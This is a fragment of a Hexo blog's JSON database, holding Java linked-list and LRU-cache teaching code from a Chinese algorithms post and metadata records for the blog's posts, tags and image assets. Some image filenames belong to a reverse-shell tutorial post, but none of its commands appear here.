class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">contains</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; p = head;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next !=<span class=\"keyword\">null</span> &amp;&amp; p.next.val!=val)&#123;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p.next != <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> Node&lt;T&gt; <span class=\"title\">node</span><span class=\"params\">(<span class=\"keyword\">int</span> index)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index &gt;= size || index &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">\"Index: \"</span>+index + <span class=\"string\">\", Size: \"</span>+size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (i == index)&#123; <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">            ++i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">push</span><span class=\"params\">(T val)</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; newNode = <span class=\"keyword\">new</span> Node&lt;&gt;(val);</span><br><span class=\"line\">        linkFirst(newNode);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">pop</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        Node&lt;T&gt; first = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (first == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> RuntimeException(<span class=\"string\">\"没有元素\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unlinkedFirst(first);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> T <span class=\"title\">unlinkedFirst</span><span class=\"params\">(Node&lt;T&gt; node)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> T element = node.val;</span><br><span class=\"line\">        head.next = head.next.next;</span><br><span class=\"line\">        node.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        node.val = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        size--;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> element;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 单链表反转</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reverse</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 链表为空或者链表只有一个元素时</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span> || size &lt;=<span class=\"number\">1</span> )&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        Node&lt;T&gt; q = p.next;</span><br><span class=\"line\">        Node&lt;T&gt; r;</span><br><span class=\"line\">        p.next = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (q !=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            r = q.next;</span><br><span class=\"line\">            q.next = p;</span><br><span class=\"line\">            p = q;</span><br><span class=\"line\">            q = r;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        head.next = p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 打印链表 example: [1, 2, 3]</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (head.next == <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">\"[]\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        sb.append(<span class=\"string\">\"[\"</span>);</span><br><span class=\"line\">        Node&lt;T&gt; p = head.next;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (p.next!=<span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            sb.append(p.val).append(<span class=\"string\">\", \"</span>);</span><br><span class=\"line\">            p = p.next;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        sb.append(p.val).append(<span class=\"string\">\"]\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Node</span>&lt;<span class=\"title\">T</span>&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> T val;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Node&lt;T&gt; next;</span><br><span class=\"line\">        Node(T val)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.val = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>基于链表的LRU缓存代码：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">T <span class=\"title\">get</span><span class=\"params\">(T val)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ListLRUCache</span>&lt;<span class=\"title\">T</span>&gt; <span class=\"keyword\">implements</span> <span class=\"title\">LRUCache</span>&lt;<span class=\"title\">T</span>&gt; </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SinglyLinkedList&lt;T&gt; lruList;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> DEFAULT_CAP=<span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 缓存容量</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> cap;</span><br><span class=\"line\">    <span class=\"comment\">// 缓存使用大小</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>(DEFAULT_CAP);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ListLRUCache</span><span class=\"params\">(<span class=\"keyword\">int</span> cap)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.cap = cap;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.lruList = <span class=\"keyword\">new</span> SinglyLinkedList&lt;&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">put</span><span class=\"params\">(T value)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果该列表中没有该数据</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (size == cap)&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">            <span class=\"comment\">// 删除最后一个节点</span></span><br><span class=\"line\">            lruList.delete(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 将该数据插入到链表头部</span></span><br><span class=\"line\">            lruList.push(value);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 2、缓存未满</span></span><br><span class=\"line\">            <span class=\"comment\">// 直接在列表头部插入该数据</span></span><br><span class=\"line\">            lruList.push(value);</span><br><span class=\"line\">            size++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> T <span class=\"title\">get</span><span class=\"params\">(T val)</span> </span>&#123;</span><br><span class=\"line\">        T result = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lruList.contains(val))&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 在list中,从list中获取该数据</span></span><br><span class=\"line\">            <span class=\"keyword\">int</span> index = lruList.indexOf(val);</span><br><span class=\"line\">            result = lruList.get(index);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"从缓存中获取\"</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 将该节点插入到链表头部</span></span><br><span class=\"line\">            lruList.delete(index);</span><br><span class=\"line\">            lruList.push(val);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">// 如果该列表中没有该数据</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"缓存中没有该数据！\"</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (size == cap)&#123;</span><br><span class=\"line\">                <span class=\"comment\">// 1、缓存满了</span></span><br><span class=\"line\">                <span class=\"comment\">// 删除最后一个节点</span></span><br><span class=\"line\">                lruList.delete(size-<span class=\"number\">1</span>);</span><br><span class=\"line\">                <span class=\"comment\">// 将该数据插入到链表头部</span></span><br><span class=\"line\">                lruList.push(val);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"缓存已满！将该数据插入到缓存\"</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 2、缓存未满</span></span><br><span class=\"line\">                <span class=\"comment\">// 直接在列表头部插入该数据</span></span><br><span class=\"line\">                lruList.push(val);</span><br><span class=\"line\">                size++;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"将该数据直接插入到缓存\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果有数据库，该数据从数据库中获取</span></span><br><span class=\"line\">            result = val;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">Size</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>字符串是否是回文字符串：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n"}],"PostAsset":[{"_id":"source/_posts/Spring面试题/springmvc流程图.jpg","slug":"springmvc流程图.jpg","post":"cjpdmuzzk00084cv0v34lluqb","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/1攻击机获得shell.jpg","slug":"1攻击机获得shell.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/算法-排序(下)/桶排序原理图.jpg","slug":"桶排序原理图.jpg","post":"cjpdmv00r00134cv0419qgiu9","modified":1,"renderable":0},{"_id":"source/_posts/hexo-安装及配置/hexo默认主题.JPG","slug":"hexo默认主题.JPG","post":"cjpdmuzzw000e4cv0s2mj1ju1","modified":0,"renderable":0},{"_id":"source/_posts/hexo-安装及配置/nodejs.jpg","slug":"nodejs.jpg","post":"cjpdmuzzw000e4cv0s2mj1ju1","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/1受害机反弹shell.jpg","slug":"1受害机反弹shell.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/1攻击机监听端口.jpg","slug":"1攻击机监听端口.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/2受害机反弹shell.jpg","slug":"2受害机反弹shell.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/2攻击机获得shell.jpg","slug":"2攻击机获得shell.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/3受害机反弹shell.jpg","slug":"3受害机反弹shell.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/3攻击机监听端口.jpg","slug":"3攻击机监听端口.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/Linux反弹shell的三种方法/3攻击机获得shell.jpg","slug":"3攻击机获得shell.jpg","post":"cjpdmuzzh00064cv00gffzbl9","modified":0,"renderable":0},{"_id":"source/_posts/算法-递归/台阶递归图.jpg","slug":"台阶递归图.jpg","post":"cjpdmv0bh002y4cv0s6obso33","modified":0,"renderable":0},{"_id":"source/_posts/算法-数组/二维数组.jpg","slug":"二维数组.jpg","post":"cjpdmv0ax002s4cv0y8pmf6ap","modified":0,"renderable":0},{"_id":"source/_posts/算法-数组/数组.jpg","slug":"数组.jpg","post":"cjpdmv0ax002s4cv0y8pmf6ap","modified":0,"renderable":0},{"_id":"source/_posts/算法-数组/数组删除.jpg","slug":"数组删除.jpg","post":"cjpdmv0ax002s4cv0y8pmf6ap","modified":0,"renderable":0},{"_id":"source/_posts/算法-栈/函数栈.jpg","slug":"函数栈.jpg","post":"cjpdmv0au002q4cv0919ctq75","modified":0,"renderable":0},{"_id":"source/_posts/算法-栈/无标题.png","slug":"无标题.png","post":"cjpdmv0au002q4cv0919ctq75","modified":0,"renderable":0},{"_id":"source/_posts/算法-栈/浏览器栈1.jpg","slug":"浏览器栈1.jpg","post":"cjpdmv0au002q4cv0919ctq75","modified":0,"renderable":0},{"_id":"source/_posts/算法-栈/浏览器栈2.jpg","slug":"浏览器栈2.jpg","post":"cjpdmv0au002q4cv0919ctq75","modified":0,"renderable":0},{"_id":"source/_posts/算法-栈/浏览器栈3.jpg","slug":"浏览器栈3.jpg","post":"cjpdmv0au002q4cv0919ctq75","modified":0,"renderable":0},{"_id":"source/_posts/算法-栈/表达式栈图.jpg","slug":"表达式栈图.jpg","post":"cjpdmv0au002q4cv0919ctq75","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/多消费者阻塞队列.jpg","slug":"多消费者阻塞队列.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/循环队列.jpg","slug":"循环队列.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/循环队列满.jpg","slug":"循环队列满.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/示例1.jpg","slug":"示例1.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/示例2.jpg","slug":"示例2.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/队列.jpg","slug":"队列.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-队列/阻塞队列.jpg","slug":"阻塞队列.jpg","post":"cjpdmv0bf002w4cv0a54d5sas","modified":0,"renderable":0},{"_id":"source/_posts/算法-排序(中)/归并排序原理图.jpg","slug":"归并排序原理图.jpg","post":"cjpdmv0ff003p4cv0mla829kv","modified":1,"renderable":0},{"_id":"source/_posts/算法-怎样写好链表代码/举例.jpg","slug":"举例.jpg","post":"cjpdmv0fi003q4cv0r1suvxds","modified":0,"renderable":0},{"_id":"source/_posts/算法-怎样写好链表代码/带头链表.jpg","slug":"带头链表.jpg","post":"cjpdmv0fi003q4cv0r1suvxds","modified":0,"renderable":0},{"_id":"source/_posts/算法-怎样写好链表代码/链表插入.jpg","slug":"链表插入.jpg","post":"cjpdmv0fi003q4cv0r1suvxds","modified":0,"renderable":0},{"_id":"source/_posts/算法-排序(上)/冒泡排序第一次过程.png","slug":"冒泡排序第一次过程.png","post":"cjpdmv0fn003s4cv04r6yof9v","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(上)/冒泡排序过程.jpg","slug":"冒泡排序过程.jpg","post":"cjpdmv0fn003s4cv04r6yof9v","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(上)/插入排序移动次数.jpg","slug":"插入排序移动次数.jpg","post":"cjpdmv0fn003s4cv04r6yof9v","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(上)/插入排序过程.jpg","slug":"插入排序过程.jpg","post":"cjpdmv0fn003s4cv04r6yof9v","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(上)/选择排序过程.jpg","slug":"选择排序过程.jpg","post":"cjpdmv0fn003s4cv04r6yof9v","modified":1,"renderable":0},{"_id":"source/_posts/算法-链表/单链表.jpg","slug":"单链表.jpg","post":"cjpdmv0fr003t4cv06qribd8b","modified":0,"renderable":0},{"_id":"source/_posts/算法-链表/单链表插入删除.jpg","slug":"单链表插入删除.jpg","post":"cjpdmv0fr003t4cv06qribd8b","modified":0,"renderable":0},{"_id":"source/_posts/算法-链表/双向循环链表.jpg","slug":"双向循环链表.jpg","post":"cjpdmv0fr003t4cv06qribd8b","modified":0,"renderable":0},{"_id":"source/_posts/算法-链表/双向链表.jpg","slug":"双向链表.jpg","post":"cjpdmv0fr003t4cv06qribd8b","modified":0,"renderable":0},{"_id":"source/_posts/算法-链表/循环链表.jpg","slug":"循环链表.jpg","post":"cjpdmv0fr003t4cv06qribd8b","modified":0,"renderable":0},{"_id":"source/_posts/算法-链表/数组与链表结构对比.jpg","slug":"数组与链表结构对比.jpg","post":"cjpdmv0fr003t4cv06qribd8b","modified":0,"renderable":0},{"_id":"source/_posts/算法-排序(下)/计算排序01.jpg","slug":"计算排序01.jpg","post":"cjpdmv00r00134cv0419qgiu9","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(下)/计数排序02.jpg","slug":"计数排序02.jpg","post":"cjpdmv00r00134cv0419qgiu9","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(下)/计数排序03.jpg","slug":"计数排序03.jpg","post":"cjpdmv00r00134cv0419qgiu9","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(下)/计数排序04.jpg","slug":"计数排序04.jpg","post":"cjpdmv00r00134cv0419qgiu9","modified":1,"renderable":0},{"_id":"source/_posts/算法-排序(下)/基数排序01.jpg","slug":"基数排序01.jpg","post":"cjpdmv00r00134cv0419qgiu9","modified":1,"renderable":0}],"PostCategory":[{"post_id":"cjpdmuzyg00004cv01n6gjyre","category_id":"cjpdmuzzd00044cv0s993ahnd","_id":"cjpdmv005000h4cv0hjpgdhye"},{"post_id":"cjpdmuzz800024cv0t61skx8f","category_id":"cjpdmuzzq000b4cv0tlqiesyz","_id":"cjpdmv00i000p4cv0s7au2i2m"},{"post_id":"cjpdmuzzh00064cv00gffzbl9","category_id":"cjpdmuzzq000b4cv0tlqiesyz","_id":"cjpdmv00m000u4cv0hntrk08t"},{"post_id":"cjpdmuzzw000e4cv0s2mj1ju1","category_id":"cjpdmv00h000o4cv0yvujy8mg","_id":"cjpdmv00q00114cv0j4tnxmqo"},{"post_id":"cjpdmv003000g4cv0opuhcf0w","category_id":"cjpdmv00m000w4cv04oeqewcd","_id":"cjpdmv00u00164cv06h5nlkq2"},{"post_id":"cjpdmv00j000r4cv0negw5xly","category_id":"cjpdmv00q00124cv0g26z86qe","_id":"cjpdmv00v00194cv08qshdyfu"},{"post_id":"cjpdmv00p00104cv0sjr5lff6","category_id":"cjpdmv00u00174cv01ci7dkhe","_id":"cjpdmv00y001d4cv0ohwpjsos"},{"post_id":"cjpdmv00r00134cv0419qgiu9","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv00z001i4cv0gt8gwkes"},{"post_id":"cjpdmv0ak002j4cv0sm8yvc7h","category_id":"cjpdmuzzd00044cv0s993ahnd","_id":"cjpdmv0aw002r4cv0alsw3ram"},{"post_id":"cjpdmv0ap002m4cv0a9wfictv","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0be002u4cv0bk1xy431"},{"post_id":"cjpdmv0au002q4cv0919ctq75","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0bh002x4cv04hzlhv96"},{"post_id":"cjpdmv0ax002s4cv0y8pmf6ap","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0bi002z4cv007eb2go0"},{"post_id":"cjpdmv0an002k4cv0jhzs2i82","category_id":"cjpdmv0as002n4cv0vm0m41kh","_id":"cjpdmv0bk00314cv0wmyssawd"},{"post_id":"cjpdmv0b1002t4cv0fa6vtc1z","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0bk00334cv0hsblsi0l"},{"post_id":"cjpdmv0bf002w4cv0a54d5sas","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0bm00364cv0ivcyq7cw"},{"post_id":"cjpdmv0bh002y4cv0s6obso33","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0bn00384cv0n5frmetx"},{"post_id":"cjpdmv0ff003p4cv0mla829kv","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0fu003u4cv0pdrh8rs9"},{"post_id":"cjpdmv0fi003q4cv0r1suvxds","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0fv003v4cv0n58wmssi"},{"post_id":"cjpdmv0fn003s4cv04r6yof9v","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0fw003x4cv0dn6wsmel"},{"post_id":"cjpdmv0fr003t4cv06qribd8b","category_id":"cjpdmv00w001a4cv00qscl1x5","_id":"cjpdmv0fw003y4cv0x9lk3zcv"}],"PostTag":[{"post_id":"cjpdmuzyg00004cv01n6gjyre","tag_id":"cjpdmuzzg00054cv040t58zf0","_id":"cjpdmv00k000s4cv0ty12j32b"},{"post_id":"cjpdmuzyg00004cv01n6gjyre","tag_id":"cjpdmuzzq000c4cv0i9q1sy0z","_id":"cjpdmv00m000v4cv0yyys8c63"},{"post_id":"cjpdmuzyg00004cv01n6gjyre","tag_id":"cjpdmv006000k4cv0xfyvkeeq","_id":"cjpdmv00o000z4cv06ez6y4fn"},{"post_id":"cjpdmuzz800024cv0t61skx8f","tag_id":"cjpdmv00i000q4cv062ouolhu","_id":"cjpdmv00x001c4cv0pty82gv8"},{"post_id":"cjpdmuzz800024cv0t61skx8f","tag_id":"cjpdmv00n000x4cv0wtnpn62d","_id":"cjpdmv00y001e4cv0t0jofooo"},{"post_id":"cjpdmuzz800024cv0t61skx8f","tag_id":"cjpdmv00s00144cv0tbscq3ug","_id":"cjpdmv00z001g4cv0eklzsdeh"},{"post_id":"cjpdmuzz800024cv0t61skx8f","tag_id":"cjpdmv00v00184cv0cq7h1h1h","_id":"cjpdmv00z001h4cv0gqw55gyq"},{"post_id":"cjpdmuzzh00064cv00gffzbl9","tag_id":"cjpdmv00i000q4cv062ouolhu","_id":"cjpdmv012001m4cv07kzx6gs7"},{"post_id":"cjpdmuzzh00064cv00gffzbl9","tag_id":"cjpdmv00y001f4cv0wv8dahsn","_id":"cjpdmv012001n4cv0ck0njb8e"},{"post_id":"cjpdmuzzh00064cv00gffzbl9","tag_id":"cjpdmv010001j4cv01f764all","_id":"cjpdmv013001p4cv0skopa8b7"},{"post_id":"cjpdmuzzh00064cv00gffzbl9","tag_id":"cjpdmv011001k4cv00cbnm71r","_id":"cjpdmv013001q4cv0ptsvc4xd"},{"post_id":"cjpdmuzzw000e4cv0s2mj1ju1","tag_id":"cjpdmv011001l4cv0xd7y6ore","_id":"cjpdmv016001u4cv00q3u4bfb"},{"post_id":"cjpdmuzzw000e4cv0s2mj1ju1","tag_id":"cjpdmv012001o4cv0yeb9xz9v","_id":"cjpdmv017001v4cv0l6s2b29p"},{"post_id":"cjpdmuzzw000e4cv0s2mj1ju1","tag_id":"cjpdmv014001r4cv0y4dvtc3u","_id":"cjpdmv017001x4cv0r9y7ofut"},{"post_id":"cjpdmuzzw000e4cv0s2mj1ju1","tag_id":"cjpdmv015001s4cv0wci4p688","_id":"cjpdmv018001y4cv0sl39r1fa"},{"post_id":"cjpdmv003000g4cv0opuhcf0w","tag_id":"cjpdmv016001t4cv0o1cy111a","_id":"cjpdmv01900214cv0rgtvqzqn"},{"post_id":"cjpdmv003000g4cv